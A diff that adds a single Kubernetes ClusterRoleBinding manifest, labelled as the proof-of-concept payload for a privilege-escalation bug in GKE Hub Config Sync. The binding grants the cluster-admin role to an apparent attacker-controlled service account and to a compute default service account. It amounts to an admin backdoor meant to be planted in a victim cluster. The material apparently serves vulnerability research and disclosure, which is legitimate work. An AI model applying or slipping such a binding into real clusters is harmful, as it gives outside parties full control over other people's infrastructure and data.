@@ -1,0 +1,19 @@
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: attacker-cluster-admin
+  labels:
+    app: bug0172-poc
+  annotations:
+    bug: "BUG-0172 (D-94602625) gkehub Config Sync two-plane privesc"
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: cluster-admin
+subjects:
+- apiGroup: rbac.authorization.k8s.io
+  kind: User
+  name: test-attackersa@imattacker.iam.gserviceaccount.com
+- apiGroup: rbac.authorization.k8s.io
+  kind: User
+  name: 910202953680-compute@developer.gserviceaccount.com
